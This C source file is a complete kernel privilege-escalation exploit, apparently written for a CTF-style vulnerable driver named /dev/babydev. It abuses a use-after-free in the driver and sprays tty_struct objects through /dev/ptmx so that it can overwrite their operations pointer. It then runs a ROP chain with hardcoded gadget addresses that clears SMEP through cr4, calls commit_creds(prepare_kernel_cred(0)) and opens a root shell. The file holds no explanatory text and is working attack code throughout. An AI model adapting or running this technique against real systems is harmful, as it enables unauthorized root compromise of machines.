#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <errno.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <string.h>
#include <pty.h>
#include <sys/mman.h>
#include <sys/ipc.h>
#include <sys/sem.h>

#define TTY_STRUCT_SIZE 0x2e0
#define SPRAY_ALLOC_TIMES 0x100

int spray_fd[0x100];

/*

tty_struct:
    int magic; // 4
    struct kref kref; // 4
    struct device *dev; // 8
    struct tty_driver *driver; // 8
    const struct tty_operations *ops; // 8, offset = 4 + 4 + 8 + 8 = 24
    [...]

*/
struct tty_operations {
	struct tty_struct * (*lookup)(struct tty_driver *driver,
			struct file *filp, int idx);
	int  (*install)(struct tty_driver *driver, struct tty_struct *tty);
	void (*remove)(struct tty_driver *driver, struct tty_struct *tty);
	int  (*open)(struct tty_struct * tty, struct file * filp);
	void (*close)(struct tty_struct * tty, struct file * filp);
	void (*shutdown)(struct tty_struct *tty);
	void (*cleanup)(struct tty_struct *tty);
	int  (*write)(struct tty_struct * tty,
		      const unsigned char *buf, int count);
	int  (*put_char)(struct tty_struct *tty, unsigned char ch);
	void (*flush_chars)(struct tty_struct *tty);
	int  (*write_room)(struct tty_struct *tty);
	int  (*chars_in_buffer)(struct tty_struct *tty);
	int  (*ioctl)(struct tty_struct *tty,
		    unsigned int cmd, unsigned long arg);
	long (*compat_ioctl)(struct tty_struct *tty,
			     unsigned int cmd, unsigned long arg);
	void (*set_termios)(struct tty_struct *tty, struct ktermios * old);
	void (*throttle)(struct tty_struct * tty);
	void (*unthrottle)(struct tty_struct * tty);
	void (*stop)(struct tty_struct *tty);
	void (*start)(struct tty_struct *tty);
	void (*hangup)(struct tty_struct *tty);
	int (*break_ctl)(struct tty_struct *tty, int state);
	void (*flush_buffer)(struct tty_struct *tty);
	void (*set_ldisc)(struct tty_struct *tty);
	void (*wait_until_sent)(struct tty_struct *tty, int timeout);
	void (*send_xchar)(struct tty_struct *tty, char ch);
	int (*tiocmget)(struct tty_struct *tty);
	int (*tiocmset)(struct tty_struct *tty,
			unsigned int set, unsigned int clear);
	int (*resize)(struct tty_struct *tty, struct winsize *ws);
	int (*set_termiox)(struct tty_struct *tty, struct termiox *tnew);
	int (*get_icount)(struct tty_struct *tty,
	struct serial_icounter_struct *icount);
	const struct file_operations *proc_fops;
};

typedef int __attribute__((regparm(3)))(*commit_creds_func)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (*prepare_kernel_cred_func)(unsigned long cred);

/* Gadgets */
commit_creds_func commit_creds = (commit_creds_func) 0xffffffff810a1420;
prepare_kernel_cred_func prepare_kernel_cred = (prepare_kernel_cred_func) 0xffffffff810a1810;
unsigned long native_write_cr4 = 0xFFFFFFFF810635B0;// mov cr4, rdi; ret
unsigned long xchgeaxesp = 0xFFFFFFFF81007808;
unsigned long poprdiret = 0xFFFFFFFF813E7D6F;
unsigned long iretq = 0xffffffff814e35ef;
unsigned long swapgs = 0xFFFFFFFF81063694;

/* status */
unsigned long user_cs, user_ss, user_eflags;
void save_stats() {
    asm(
            "movq %%cs, %0\n"
            "movq %%ss, %1\n"
            "pushfq\n"
            "popq %2\n"
            :"=r"(user_cs), "=r"(user_ss), "=r"(user_eflags)
            :
            : "memory"
            );
}

void get_shell() {
    system("/bin/sh");
}

void shellcode() {
    commit_creds(prepare_kernel_cred(0));
}

void exploit() {
    char *buf = (char*) malloc(0x1000);
    char *fake_file_operations = (char*) calloc(0x1000, 1); // big enough to be file_operations
    struct tty_operations *fake_tty_operations = (struct tty_operations *) malloc(sizeof(struct tty_operations));

    save_stats();

    memset(fake_tty_operations, 0, sizeof(struct tty_operations));
    fake_tty_operations->proc_fops = &fake_file_operations;
    fake_tty_operations->ioctl = (unsigned long)xchgeaxesp;

    int fd1 = open("/dev/babydev", O_RDWR);
    int fd2 = open("/dev/babydev", O_RDWR);
    int fd;
    //ioctl(fd2, 0x10001, 0xa8); // the same'11 as cred struct size
    ioctl(fd2, 0x10001, TTY_STRUCT_SIZE);
    write(fd2, "hello world", strlen("hello world"));
    close(fd1);
    fd = fd2;

    // spray tty
    puts("[+] Spraying buffer with tty_struct");
    for (int i = 0; i < SPRAY_ALLOC_TIMES; i++) {
        spray_fd[i] = open("/dev/ptmx", O_RDWR | O_NOCTTY);
        if (spray_fd[i] < 0) {
            perror("open tty");
        }
    }

    // now we have a tty_struct in our buffer
    puts("[+] Reading buffer content from kernel buffer");
    long size = read(fd, buf, 32);
    if (size < 32) {
        puts("[-] Reading not complete!");
        printf("[-] Only %ld bytes read.\n", size);
    }
    puts("[+] Detecting buffer content type");
    if (buf[0] != 0x01 || buf[1] != 0x54) {
        puts("[-] tty_struct spray failed");
        printf("[-] We should have 0x01 and 0x54, instead we got %02x %02x\n", buf[0], buf[1]);
        puts("[-] Exiting...");
        exit(-1);
    }

    puts("[+] Spray complete. Modifying function pointer");
    unsigned long *temp = (unsigned long*)&buf[24];
    *temp = (unsigned long)fake_tty_operations;

    puts("[+] Preparing ROP chain");
    unsigned long lower_address = xchgeaxesp & 0xFFFFFFFF;
    unsigned long base = lower_address & ~0xfff;
    printf("[+] Base address is %lx\n", base);
    if (mmap(base, 0x30000, 7, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0) != base) {
        perror("mmap");
        exit(1);
    }

    unsigned long rop_chain[] = {
        poprdiret,
        0x6f0,
        native_write_cr4,
        (unsigned long)shellcode,
        swapgs,
        base,
        iretq,
        (unsigned long)get_shell,
        user_cs,
        user_eflags,
        base + 0x10000,
        user_ss
    };
    memcpy((void*)lower_address, rop_chain, sizeof(rop_chain));

    puts("[+] Writing function pointer to the driver");
    long len = write(fd, buf, 32);
    if (len < 0) {
        perror("write");
        exit(1);
    }

    puts("[+] Triggering");
    for (int i = 0;i < 256; i++) {
        ioctl(spray_fd[i], 0, 0);
    }

}
int main() {
    exploit();
    return 0;
}
